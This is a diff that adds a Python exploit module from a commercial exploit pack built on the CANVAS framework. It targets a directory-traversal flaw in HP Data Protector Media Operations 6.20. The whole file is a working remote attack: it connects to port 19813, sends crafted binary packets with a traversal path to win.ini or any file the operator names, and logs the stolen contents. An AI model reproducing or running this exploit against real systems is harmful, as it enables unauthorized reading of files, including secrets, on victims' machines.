@@ -1,0 +1,118 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2011
+#
+
+import sys
+import re
+import random
+import time
+import thread
+import struct
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from libs.spkproxy import header, body
+from libs.canvasos import *
+import libs.spkproxy as spkproxy
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "HP Data Protector Media Operations Directory Traversal Vulnerability"
+DESCRIPTION = "Directory traversal vulnerability in HP Data Protector Media Operations"
+VERSION = "0.1"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "HP"
+DOCUMENTATION["Date public"] = "2011.11.04"
+DOCUMENTATION["VersionsAffected"] = "HP Data Protector Media Operations 6.20"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/50531"
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES = ""
+
+CHANGELOG = ""
+
+	
+class theexploit(tcpexploit):
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.setInfo(DESCRIPTION)
+		self.name = NAME       
+		self.port = 19813
+		self.version = 0		
+		self.filename = "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
+		return
+
+    	        
+	def run(self):		
+		# Check arguments
+		self.host = self.target.interface
+		self.port = self.argsDict.get("port", self.port)
+		self.filename = self.argsDict.get("filename", self.filename)
+					               
+		self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))                
+		self.log("Attacking %s:%d"%(self.host, self.port))                	
+
+		datalen = struct.pack(">B", len(self.filename))
+
+		step1 = "\x01\x00\x00\x01\x00\x00\x00\x00\x01\x02\x03\x04"                
+        
+		sploitstring = "\x03\x00\x00\x01\x00\x00\x00\x06\x01\x02\x03\x04\x90\x00\x44\x00"
+		sploitstring += "\x00\x00\x03\x00\x00\x01\x00\x00\x00\x44\x01\x02\x03\x04\x10\x00"
+		sploitstring += "\x00\x00" + datalen + self.filename + "\x00"*41             
+		
+		try:
+		  s = self.gettcpsock()
+		  s.connect((self.host, self.port))
+		  
+		  # Get header 
+		  s.recv(1024)
+		  
+		  # Send first resquest
+		  s.send(step1)
+		  s.recv(1024)
+		  
+		  # Send main payload
+		  s.send(sploitstring)		  
+		  s.recv(1024)
+		  data = s.recv(10240)		  		  
+		except:
+		  self.log("[D2] connection error (host:%s port:%d" % (self.host, self.port))        		  
+		
+		self.log(data[12:])		
+                		          
+		self.setInfo('[D2] %s attacking %s:%d - done' % (NAME, self.host, self.port))
+						            
+		return 1            
+       
+			  		
+	def usage(self):        
+		print "Usage: %s -v version -t targethost -l localip -d localport [-O ssl:0|1]\n" % sys.argv[0]					
+		sys.exit(0) 
+
+
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
